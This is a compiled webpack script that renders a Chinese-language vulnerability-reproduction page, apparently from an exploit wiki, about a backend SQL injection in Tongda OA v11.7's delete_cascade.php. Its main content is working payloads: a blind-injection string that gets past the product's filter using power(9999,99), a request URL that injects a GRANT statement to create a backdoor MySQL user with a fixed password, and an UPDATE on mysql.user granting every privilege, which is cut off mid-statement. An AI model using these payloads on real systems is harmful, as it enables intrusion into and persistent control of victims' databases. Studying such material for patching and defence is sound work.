(window.webpackJsonp=window.webpackJsonp||[]).push([[11],{1371:function(t,s,a){t.exports=a.p+"assets/img/tongdaoa-3.cd7baad1.png"},1372:function(t,s,a){t.exports=a.p+"assets/img/tongdaoa-4.57bddb25.png"},1373:function(t,s,a){t.exports=a.p+"assets/img/tongdaoa-5.c272a7dd.png"},1374:function(t,s,a){t.exports=a.p+"assets/img/tongdaoa-6.6ebc2575.png"},1375:function(t,s,a){t.exports=a.p+"assets/img/tongdaoa-7.12e7df7a.png"},1376:function(t,s,a){t.exports=a.p+"assets/img/tongdaoa-8.2f0354c8.png"},1377:function(t,s,a){t.exports=a.p+"assets/img/tongdaoa-9.1f608d60.png"},1378:function(t,s,a){t.exports=a.p+"assets/img/tongdaoa-10.e2c5b2b2.png"},1379:function(t,s,a){t.exports=a.p+"assets/img/tongdaoa-11.2b918035.png"},1380:function(t,s,a){t.exports=a.p+"assets/img/tongdaoa-12.4441e4c9.png"},2227:function(t,s,a){"use strict";a.r(s);var n=a(75),e=Object(n.a)({},(function(){var t=this,s=t.$createElement,n=t._self._c||s;return n("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[n("h1",{attrs:{id:"通达oa-v11-7-delete-cascade-php-后台sql注入"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#通达oa-v11-7-delete-cascade-php-后台sql注入"}},[t._v("#")]),t._v(" 通达OA v11.7 delete_cascade.php 后台SQL注入")]),t._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),n("p",[t._v("通达OA v11.7后台存在SQL注入，可通过此漏洞写入恶意后门文件攻击目标服务器")]),t._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("通达OA v11.7")]),n("br"),t._v(" "),n("h2",{attrs:{id:"环境搭建"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[t._v("#")]),t._v(" 环境搭建")]),t._v(" "),n("a-checkbox",{attrs:{checked:""}},[t._v("环境地址: https://cdndown.tongda2000.com/oa/2019/TDOA11.7.exe")]),n("br"),t._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),n("p",[t._v("在 "),n("strong",[t._v("general/hr/manage/query/delete_cascade.php")]),t._v(" 文件中")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1371),alt:"img"}})]),t._v(" "),n("p",[t._v("首先判断"),n("code",[t._v("$condition_cascade")]),t._v("是否为空，如果不为空，则将其中的"),n("code",[t._v("\\'")]),t._v("替换为"),n("code",[t._v("'")]),t._v("。为什么要这样替换呢，主要是因为V11.7版本中，注册变量时考虑了安全问题，将用户输入的字符用"),n("code",[t._v("addslashes")]),t._v("函数进行保护，如下：")]),t._v(" "),n("p",[n("strong",[t._v("inc/common.inc.php")]),t._v(" 代码")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1372),alt:"img"}})]),t._v(" "),n("p",[t._v("使用盲注对SQL注入进行测试")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1373),alt:"img"}})]),t._v(" "),n("p",[t._v("触发了通达OA的SQL注入拦截")]),t._v(" "),n("p",[n("strong",[t._v("inc/conn.php")]),t._v("文件中找到过滤机制如下:")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1374),alt:"img"}})]),t._v(" "),n("p",[t._v("其过滤了一些字符，但是并非无法绕过，盲注的核心是："),n("code",[t._v("substr、if")]),t._v("等函数，均未被过滤，那么只要构造MySQL报错即可配合"),n("code",[t._v("if")]),t._v("函数进行盲注了，翻看局外人师傅在补天白帽大会上的分享，发现"),n("code",[t._v("power(9999,99)")]),t._v("也可以使数据库报错，所以构造语句：")]),t._v(" "),n("div",{staticClass:"language-sql line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-sql"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("select")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("if")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),t._v("substr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("user")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'r'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v("power"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("9999")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("99")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token comment"}},[t._v("# 当字符相等时，不报错，错误时报错")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:a(1375),alt:"img"}})]),t._v(" "),n("p",[n("img",{attrs:{src:a(1376),alt:"img"}})]),t._v(" "),n("p",[t._v("添加SQL数据库用户")]),t._v(" "),n("div",{staticClass:"language-sql line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-sql"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("grant")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("all")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("privileges")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("ON")]),t._v(" mysql"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("*")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("TO")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'peiqi'")]),n("span",{pre:!0,attrs:{class:"token variable"}},[t._v("@'%'")]),t._v(" IDENTIFIED "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("BY")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'peiqiABC@123'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("WITH")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("GRANT")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("OPTION")]),t._v("\n")])]),t._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[t._v("1")]),n("br")])]),n("p",[t._v("访问 **http://xxx.xxx.xxx.xxx/general/hr/manage/query/delete_cascade.php?condition_cascade=grant all privileges ON mysql. "),n("em",[t._v("TO 'peiqi'@'%' IDENTIFIED BY 'peiqiABC@123' WITH GRANT OPTION")])]),t._v(" "),n("p",[t._v("进入 "),n("strong",[t._v("Myoa/mysql5/bin")]),t._v(" 目录 执行 "),n("strong",[t._v("mysql -upeiqi -p")]),t._v(" 输入密码查询所有用户")]),t._v(" "),n("p",[n("img",{attrs:{src:a(1377),alt:"img"}})]),t._v(" "),n("p",[t._v("发现成功执行添加一个账户")]),t._v(" "),n("p",[t._v("然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限：")]),t._v(" "),n("div",{staticClass:"language-sql line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-sql"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("UPDATE")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("mysql"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(".")]),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("user"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("SET")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Password"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'*FBCFBB73CF21D4F464A95E775B40AF27A679CD2D'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Select_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Insert_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Update_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Delete_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Create_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Drop_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Reload_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Shutdown_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Process_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("File_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Grant_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("References_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Index_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Alter_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Show_db_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Super_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Create_tmp_table_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Lock_tables_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Execute_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Repl_slave_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Repl_client_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Create_view_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Show_view_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Create_routine_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Alter_routine_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Create_user_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Event_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Trigger_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Create_tablespace_priv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("ssl_type"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("ssl_cipher"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("x509_issuer"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("x509_subject"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("max_questions"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("max_updates"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("max_connections"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("max_user_connections"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("0")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("plugin"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'mysql_native_password'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("authentication_string"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("''")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("password_expired"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'Y'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("WHERE")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token identifier"}},[n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")]),t._v("Host"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("`")])]),t._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),t._v(" Cast"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[t._v("'%'")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("AS")]),t._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[t._v("Binary")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[t._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),n("span",{pre:!0,attrs:{class:"token 